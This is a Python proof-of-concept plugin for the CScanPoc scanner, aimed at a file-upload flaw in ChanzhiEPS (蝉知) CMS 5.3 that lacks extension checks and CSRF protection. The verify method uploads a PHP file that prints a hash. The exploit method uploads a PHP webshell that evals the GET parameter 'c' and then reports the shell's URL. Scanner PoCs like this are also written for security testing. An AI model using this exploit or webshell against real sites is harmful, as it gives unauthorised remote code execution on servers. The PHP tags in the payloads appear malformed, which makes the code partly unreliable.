# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import hashlib


class Vuln(ABVuln):
    vuln_id = 'chanzhiEPS_0003_L'  # 平台漏洞编号，留空
    name = '蝉知 CMS5.3 CRSF getshell'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD  # 漏洞类型
    disclosure_date = '2016-05-30'  # 漏洞公布时间
    desc = '''
        /system/module/package/control.php
        后台这里上传文件的时候，没有判断文件后缀，直接通过move_uploaded_file移动到package目录下了。而这里没有token，所以可以通过CSRF漏洞getshell。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3890/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'chanzhiEPS(蝉知门户系统)'  # 漏洞应用名称
    product_version = '5.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1f047969-7ac6-4ffe-88f2-852572cdae09'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 获取cookies
            cookies = {}
            '''
            raw_cookies = 'bid=xxxxx;_pk_ref.100001.8cb4=xxxxxxx;__utma=xxxxx'
            for line in raw_cookies.split(';'):  
                key,value=line.split('=',1)#1代表只分一次，得到两个数据  
                cookies[key]=value 
            '''

            # 登录后台用户
            s = requests.session()
            payload = '/chanzhi/admin.php?m=package&f=upload'
            url = self.target + payload
            s.get(url, cookies=cookies)

            headers = {
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryGgFOYWAluy1F8lvn",
                "Accept-Language": "zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4",
            }
            data = """
                ------WebKitFormBoundaryGgFOYWAluy1F8lvn
                Content-Disposition: form-data; name="file"; filename="php.php"
                Content-Type: text/php

                <?php echo md5(c);>
                ------WebKitFormBoundaryGgFOYWAluy1F8lvn--
            """
            s.post(url, headers=headers, data=data)
            verify_url = self.target + '/chanzhi/system/tmp/package/php.php'
            r = s.get(verify_url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=verify_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 获取cookies
            cookies = {}
            '''
            raw_cookies = 'bid=xxxxx;_pk_ref.100001.8cb4=xxxxxxx;__utma=xxxxx'
            for line in raw_cookies.split(';'):  
                key,value=line.split('=',1)#1代表只分一次，得到两个数据  
                cookies[key]=value 
            '''

            # 登录后台用户
            s = requests.session()
            payload = '/chanzhi/admin.php?m=package&f=upload'
            url = self.target + payload
            s.get(url, cookies=cookies)

            headers = {
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryGgFOYWAluy1F8lvn",
                "Accept-Language": "zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4",
            }
            data = """
                ------WebKitFormBoundaryGgFOYWAluy1F8lvn
                Content-Disposition: form-data; name="file"; filename="php.php"
                Content-Type: text/php

                <?php echo md5(c);@eval($_GET['c']);>
                ------WebKitFormBoundaryGgFOYWAluy1F8lvn--
            """
            s.post(url, headers=headers, data=data)
            verify_url = self.target + '/chanzhi/system/tmp/package/php.php'
            r = s.get(verify_url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，已上传webshell地址:{url}密码为c,请及时删除。'.format(
                    target=self.target, name=self.vuln.name, url=verify_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
